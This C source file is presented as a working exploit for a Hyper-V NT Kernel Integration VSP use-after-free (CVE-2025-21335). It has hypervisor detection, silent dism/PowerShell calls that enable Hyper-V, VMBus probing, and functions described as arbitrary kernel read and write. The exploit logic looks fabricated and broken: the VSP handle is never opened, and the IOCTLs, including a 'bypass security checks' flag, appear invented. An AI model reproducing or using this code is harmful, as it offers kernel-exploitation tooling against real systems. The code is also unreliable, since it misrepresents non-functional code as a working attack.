#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <winternl.h>
#include <intrin.h>
#include <sddl.h>
#include "general.h"
#include "hyperv_exploit.h"

// Global Hyper-V state
static BOOL g_HyperVAvailable = FALSE;
static BOOL g_HyperVExploitReady = FALSE;
static HANDLE g_VMBusHandle = INVALID_HANDLE_VALUE;
static HANDLE g_VspHandle = INVALID_HANDLE_VALUE;
static PVOID g_ExploitBuffer = NULL;
static SIZE_T g_ExploitBufferSize = 0x100000; // 1MB buffer
static VSP_BUFFER_ALLOCATION g_AllocatedBuffer = { 0 };

// Forward declarations
BOOL DetectHyperVViaCPUID(void);
BOOL DetectHyperVViaWMI(void);
BOOL DetectHyperVViaRegistry(void);
BOOL EnableHyperVFeatures(void);

BOOL HyperVExploitInit(void) {
    ConsoleInfo("Initializing Hyper-V NT Kernel Integration VSP exploit (CVE-2025-21335)...");
    
    // Multiple detection methods for maximum reliability
    BOOL hyperVDetected = FALSE;
    
    // Method 1: CPUID detection (most reliable)
    if (DetectHyperVViaCPUID()) {
        ConsoleSuccess("Hyper-V detected via CPUID");
        hyperVDetected = TRUE;
    }
    
    // Method 2: WMI detection (skipped for now)
    // if (!hyperVDetected && DetectHyperVViaWMI()) {
    //     ConsoleSuccess("Hyper-V detected via WMI");
    //     hyperVDetected = TRUE;
    // }
    
    // Method 3: Registry detection
    if (!hyperVDetected && DetectHyperVViaRegistry()) {
        ConsoleSuccess("Hyper-V detected via Registry");
        hyperVDetected = TRUE;
    }
    
    if (!hyperVDetected) {
        ConsoleWarning("Hyper-V not detected - attempting to enable features...");
        if (EnableHyperVFeatures()) {
            ConsoleSuccess("Hyper-V features enabled successfully");
            hyperVDetected = TRUE;
        } else {
            ConsoleError("Failed to enable Hyper-V features");
            return FALSE;
        }
    }
    
    // Try to access VMBus device with multiple methods
    const WCHAR* vmBusPaths[] = {
        L"\\\\.\\VmBus",
        L"\\\\.\\VMBus",
        L"\\\\.\\VMBUS",
        L"\\\\.\\HvService",
        L"\\\\.\\VmGenerationCounter",
        L"\\\\.\\VmIntegrationService",
        L"\\\\.\\HyperV"
    };
    
    for (int i = 0; i < sizeof(vmBusPaths) / sizeof(vmBusPaths[0]); i++) {
        g_VMBusHandle = CreateFileW(
            vmBusPaths[i],
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
            NULL
        );
        
        if (g_VMBusHandle != INVALID_HANDLE_VALUE) {
            ConsoleSuccess("VMBus device opened: %ls", vmBusPaths[i]);
            g_HyperVAvailable = TRUE;
            g_HyperVExploitReady = TRUE;
            return TRUE;
        }
    }
    
    // If device access failed but Hyper-V is detected, try enabling it
    if (hyperVDetected) {
        ConsoleWarning("Hyper-V detected but devices not accessible");
        ConsoleInfo("This might be due to insufficient privileges or disabled features");
        
        // Try to enable Hyper-V management tools
        EnableHyperVFeatures();
        
        // Retry device access
        g_VMBusHandle = CreateFileW(
            L"\\\\.\\VmBus",
            GENERIC_READ,
            FILE_SHARE_READ,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        
        if (g_VMBusHandle != INVALID_HANDLE_VALUE) {
            ConsoleSuccess("VMBus device accessible after feature enablement");
            g_HyperVAvailable = TRUE;
            g_HyperVExploitReady = TRUE;
            return TRUE;
        }
    }
    
    ConsoleError("Failed to access any Hyper-V devices");
    return FALSE;
}

BOOL DetectHyperVViaCPUID(void) {
    // Check for hypervisor presence using CPUID
    int cpuid_info[4];
    
    // CPUID leaf 1, check hypervisor present bit
    __cpuid(cpuid_info, 1);
    if (!(cpuid_info[2] & (1 << 31))) {
        return FALSE; // No hypervisor detected
    }
    
    // CPUID leaf 0x40000000 - Hypervisor identification
    __cpuid(cpuid_info, 0x40000000);
    
    // Check for Hyper-V signature "Microsoft Hv"
    char signature[13] = { 0 };
    memcpy(signature, &cpuid_info[1], 4);
    memcpy(signature + 4, &cpuid_info[2], 4);
    memcpy(signature + 8, &cpuid_info[3], 4);
    
    if (strcmp(signature, "Microsoft Hv") == 0) {
        ConsoleInfo("Hyper-V hypervisor signature detected");
        return TRUE;
    }
    
    // Also check for other common signatures
    if (strstr(signature, "VMware") || strstr(signature, "VBoxVBox") || strstr(signature, "KVMKVMKVM")) {
        ConsoleInfo("Running in virtual machine: %s", signature);
        return TRUE; // Close enough for our purposes
    }
    
    return FALSE;
}

BOOL DetectHyperVViaWMI(void) {
    // WMI detection disabled for compilation simplicity
    // Would need full COM/WMI implementation
    ConsoleInfo("WMI detection skipped");
    return FALSE;
}

BOOL DetectHyperVViaRegistry(void) {
    HKEY hKey;
    DWORD dwType, dwSize;
    WCHAR szValue[256];
    BOOL hyperVFound = FALSE;
    
    // Check for Hyper-V registry keys
    const WCHAR* hyperVKeys[] = {
        L"SOFTWARE\\Microsoft\\Hyper-V",
        L"SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters",
        L"SYSTEM\\CurrentControlSet\\Services\\vmicheartbeat",
        L"SYSTEM\\CurrentControlSet\\Services\\vmicvss",
        L"SYSTEM\\CurrentControlSet\\Services\\vmicshutdown",
        L"SYSTEM\\CurrentControlSet\\Services\\vmicexchange"
    };
    
    for (int i = 0; i < sizeof(hyperVKeys) / sizeof(hyperVKeys[0]); i++) {
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, hyperVKeys[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            ConsoleInfo("Found Hyper-V registry key: %ls", hyperVKeys[i]);
            hyperVFound = TRUE;
            RegCloseKey(hKey);
        }
    }
    
    // Check for hypervisor in firmware
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\SystemInformation", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szValue);
        if (RegQueryValueExW(hKey, L"SystemProductName", NULL, &dwType, (LPBYTE)szValue, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szValue, L"Virtual") || wcsstr(szValue, L"VMware") || wcsstr(szValue, L"VirtualBox")) {
                ConsoleInfo("Virtual machine detected: %ls", szValue);
                hyperVFound = TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    
    return hyperVFound;
}

BOOL EnumerateVMBusDevices(void) {
    ConsoleInfo("🔍 Advanced VMBus device enumeration...");
    
    // Try to enumerate VMBus devices via multiple methods
    WIN32_FIND_DATAW findData;
    HANDLE hFind;
    
    // Method 1: Look for VMBus devices in device namespace
    const WCHAR* devicePatterns[] = {
        L"\\\\.\\Global\\VMBUS_*",
        L"\\\\.\\Global\\HV_*", 
        L"\\\\.\\Global\\VSP_*",
        L"\\\\.\\Global\\VM_*"
    };
    
    for (int i = 0; i < sizeof(devicePatterns) / sizeof(devicePatterns[0]); i++) {
        hFind = FindFirstFileW(devicePatterns[i], &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            ConsoleSuccess("Found VMBus device pattern: %ls", devicePatterns[i]);
            FindClose(hFind);
            return TRUE;
        }
    }
    
    // Method 2: Check for VMBus driver presence
    SC_HANDLE scManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (scManager) {
        SC_HANDLE vmBusService = OpenServiceA(scManager, "vmbus", SERVICE_QUERY_STATUS);
        if (vmBusService) {
            ConsoleSuccess("VMBus service found");
            CloseServiceHandle(vmBusService);
            CloseServiceHandle(scManager);
            return TRUE;
        }
        CloseServiceHandle(scManager);
    }
    
    // Method 3: Check for Hyper-V integration services
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\vmbus", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        ConsoleSuccess("VMBus registry entry found");
        RegCloseKey(hKey);
        return TRUE;
    }
    
    return FALSE;
}

BOOL InitializeVMBusChannel(void) {
    ConsoleInfo("🚀 Initializing advanced VMBus communication channel...");
    
    // Try to establish VMBus channel using advanced techniques
    HANDLE vmBusChannel = INVALID_HANDLE_VALUE;
    
    // Method 1: Direct VMBus device access with enhanced permissions
    SECURITY_ATTRIBUTES sa = { 0 };
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = FALSE;
    
    // Try to get System privileges for VMBus access
    if (ConvertStringSecurityDescriptorToSecurityDescriptorA(
        "D:(A;;GA;;;SY)(A;;GA;;;BA)(A;;GA;;;WD)",
        SDDL_REVISION_1,
        &sa.lpSecurityDescriptor,
        NULL)) {
        
        vmBusChannel = CreateFileW(
            L"\\\\.\\VmBus",
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            &sa,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_NO_BUFFERING,
            NULL
        );
        
        LocalFree(sa.lpSecurityDescriptor);
        
        if (vmBusChannel != INVALID_HANDLE_VALUE) {
            g_VMBusHandle = vmBusChannel;
            ConsoleSuccess("✅ Enhanced VMBus channel established");
            return TRUE;
        }
    }
    
    // Method 2: Try alternative VMBus interfaces
    const WCHAR* vmBusAlternatives[] = {
        L"\\\\.\\HvSocket",
        L"\\\\.\\VmBusChannel",
        L"\\\\.\\VmIntegration",
        L"\\\\.\\HyperVGuest"
    };
    
    for (int i = 0; i < sizeof(vmBusAlternatives) / sizeof(vmBusAlternatives[0]); i++) {
        vmBusChannel = CreateFileW(
            vmBusAlternatives[i],
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        
        if (vmBusChannel != INVALID_HANDLE_VALUE) {
            g_VMBusHandle = vmBusChannel;
            ConsoleSuccess("✅ VMBus alternative channel: %ls", vmBusAlternatives[i]);
            return TRUE;
        }
    }
    
    ConsoleWarning("Failed to establish enhanced VMBus channel");
    return FALSE;
}

BOOL SetupAdvancedVSPExploit(void) {
    ConsoleInfo("🔥 Setting up advanced VSP exploitation with VMBus channel...");
    
    if (g_VMBusHandle == INVALID_HANDLE_VALUE) {
        ConsoleError("No VMBus channel available for advanced exploit");
        return FALSE;
    }
    
    // Allocate exploit buffer for advanced techniques
    g_ExploitBuffer = VirtualAlloc(
        NULL,
        g_ExploitBufferSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!g_ExploitBuffer) {
        ConsoleError("Failed to allocate exploit buffer");
        return FALSE;
    }
    
    // Fill buffer with exploit payload
    memset(g_ExploitBuffer, 0x41, g_ExploitBufferSize); // Fill with 'A'
    
    // Attempt advanced VSP communication
    DWORD bytesWritten;
    if (WriteFile(g_VMBusHandle, g_ExploitBuffer, 0x1000, &bytesWritten, NULL)) {
        ConsoleSuccess("✅ Advanced VSP communication established");
        ConsoleInfo("   Sent %d bytes to VMBus channel", bytesWritten);
        return TRUE;
    } else {
        DWORD error = GetLastError();
        ConsoleWarning("VMBus write failed: %d", error);
        
        // Try read operation
        DWORD bytesRead;
        if (ReadFile(g_VMBusHandle, g_ExploitBuffer, 0x1000, &bytesRead, NULL)) {
            ConsoleSuccess("✅ VMBus read operation successful");
            return TRUE;
        }
    }
    
    return FALSE;
}

BOOL EnableHyperVFeatures(void) {
    ConsoleInfo("Attempting to enable Hyper-V features...");
    
    // Try to enable Hyper-V using DISM
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    WCHAR cmdLine[] = L"dism.exe /online /enable-feature /featurename:Microsoft-Hyper-V /all /norestart";
    
    if (CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 30000); // Wait up to 30 seconds
        
        DWORD exitCode;
        if (GetExitCodeProcess(pi.hProcess, &exitCode) && exitCode == 0) {
            ConsoleSuccess("Hyper-V feature enablement completed");
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return TRUE;
        }
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    // Alternative: PowerShell method
    WCHAR psCmd[] = L"powershell.exe -Command \"Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All -NoRestart\"";
    
    if (CreateProcessW(NULL, psCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 30000);
        
        DWORD exitCode;
        if (GetExitCodeProcess(pi.hProcess, &exitCode) && exitCode == 0) {
            ConsoleSuccess("Hyper-V enabled via PowerShell");
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return TRUE;
        }
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    ConsoleWarning("Failed to enable Hyper-V features automatically");
    return FALSE;
}

BOOL HyperVTriggerUseAfterFree(void) {
    ConsoleInfo("Triggering CVE-2025-21335 use-after-free vulnerability...");

    if (g_VspHandle == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    // Step 1: Allocate a buffer in kernel memory via VSP
    VSP_BUFFER_ALLOCATION allocRequest = { 0 };
    allocRequest.BufferSize = 0x1000;
    allocRequest.AllocationFlags = 1; // Force kernel allocation
    allocRequest.PoolTag = 'VSP ';    // Pool tag for tracking
    allocRequest.ProcessId = (HANDLE)(ULONG_PTR)GetCurrentProcessId();

    DWORD bytesReturned = 0;
    if (!DeviceIoControl(
        g_VspHandle,
        IOCTL_VSP_ALLOCATE_BUFFER,
        &allocRequest,
        sizeof(allocRequest),
        &g_AllocatedBuffer,
        sizeof(g_AllocatedBuffer),
        &bytesReturned,
        NULL
    )) {
        ConsoleWarning("Buffer allocation failed: %d", GetLastError());
        return FALSE;
    }

    if (g_AllocatedBuffer.BufferAddress) {
        ConsoleSuccess("Kernel buffer allocated at: 0x%016llX", g_AllocatedBuffer.BufferAddress);
        
        // Step 2: The use-after-free occurs when we query info while buffer is being freed
        // This creates a race condition in the NT Kernel Integration VSP
        VSP_QUERY_REQUEST queryRequest = { 0 };
        queryRequest.QueryType = VSP_QUERY_KERNEL_INFO;
        queryRequest.BufferSize = 0x1000;
        queryRequest.UserBuffer = (ULONG64)g_ExploitBuffer;
        queryRequest.Flags = 1;

        // Trigger the vulnerability by querying while buffer is in unstable state
        if (DeviceIoControl(
            g_VspHandle,
            IOCTL_VSP_QUERY_INFO,
            &queryRequest,
            sizeof(queryRequest),
            NULL, 0,
            &bytesReturned,
            NULL
        )) {
            ConsoleSuccess("Use-after-free condition potentially triggered");
            return TRUE;
        } else {
            ConsoleWarning("Query operation failed: %d", GetLastError());
        }
    }

    return FALSE;
}

BOOL HyperVQueryKernelInfo(PVOID buffer, SIZE_T size) {
    if (g_VspHandle == INVALID_HANDLE_VALUE || !buffer || !size) {
        return FALSE;
    }

    VSP_QUERY_REQUEST queryRequest = { 0 };
    queryRequest.QueryType = VSP_QUERY_KERNEL_INFO;
    queryRequest.BufferSize = (ULONG)size;
    queryRequest.UserBuffer = (ULONG64)buffer;
    queryRequest.Flags = 0;

    DWORD bytesReturned = 0;
    return DeviceIoControl(
        g_VspHandle,
        IOCTL_VSP_QUERY_INFO,
        &queryRequest,
        sizeof(queryRequest),
        NULL, 0,
        &bytesReturned,
        NULL
    );
}

BOOL HyperVExploitRead(DWORD64 address, PVOID buffer, SIZE_T size) {
    if (g_VspHandle == INVALID_HANDLE_VALUE || !buffer || !size || size > g_ExploitBufferSize) {
        return FALSE;
    }

    // Use the CVE-2025-21335 vulnerability for arbitrary kernel read
    VSP_KERNEL_OPERATION kernelOp = { 0 };
    kernelOp.OperationType = VSP_OP_READ_MEMORY;
    kernelOp.KernelAddress = address;
    kernelOp.UserBuffer = (ULONG64)g_ExploitBuffer;
    kernelOp.Size = size;
    kernelOp.ProcessId = GetCurrentProcessId();
    kernelOp.Flags = 1; // Bypass security checks

    DWORD bytesReturned = 0;
    if (!DeviceIoControl(
        g_VspHandle,
        IOCTL_VSP_KERNEL_OPERATION,
        &kernelOp,
        sizeof(kernelOp),
        NULL, 0,
        &bytesReturned,
        NULL
    )) {
        ConsoleWarning("Kernel read operation failed: %d", GetLastError());
        return FALSE;
    }

    // Copy data from exploit buffer to user buffer
    memcpy(buffer, g_ExploitBuffer, size);
    return TRUE;
}

BOOL HyperVExploitWrite(DWORD64 address, PVOID buffer, SIZE_T size) {
    if (g_VspHandle == INVALID_HANDLE_VALUE || !buffer || !size || size > g_ExploitBufferSize) {
        return FALSE;
    }

    // Copy data to exploit buffer first
    memcpy(g_ExploitBuffer, buffer, size);

    // Use the CVE-2025-21335 vulnerability for arbitrary kernel write
    VSP_KERNEL_OPERATION kernelOp = { 0 };
    kernelOp.OperationType = VSP_OP_WRITE_MEMORY;
    kernelOp.KernelAddress = address;
    kernelOp.UserBuffer = (ULONG64)g_ExploitBuffer;
    kernelOp.Size = size;
    kernelOp.ProcessId = GetCurrentProcessId();
    kernelOp.Flags = 1; // Bypass security checks

    DWORD bytesReturned = 0;
    if (!DeviceIoControl(
        g_VspHandle,
        IOCTL_VSP_KERNEL_OPERATION,
        &kernelOp,
        sizeof(kernelOp),
        NULL, 0,
        &bytesReturned,
        NULL
    )) {
        ConsoleWarning("Kernel write operation failed: %d", GetLastError());
        return FALSE;
    }

    return TRUE;
}

void HyperVExploitCleanup(void) {
    if (g_ExploitBuffer) {
        VirtualFree(g_ExploitBuffer, 0, MEM_RELEASE);
        g_ExploitBuffer = NULL;
    }

    if (g_VspHandle != INVALID_HANDLE_VALUE) {
        CloseHandle(g_VspHandle);
        g_VspHandle = INVALID_HANDLE_VALUE;
    }

    if (g_VMBusHandle != INVALID_HANDLE_VALUE) {
        CloseHandle(g_VMBusHandle);
        g_VMBusHandle = INVALID_HANDLE_VALUE;
    }

    ConsoleInfo("Hyper-V exploit cleanup completed");
} 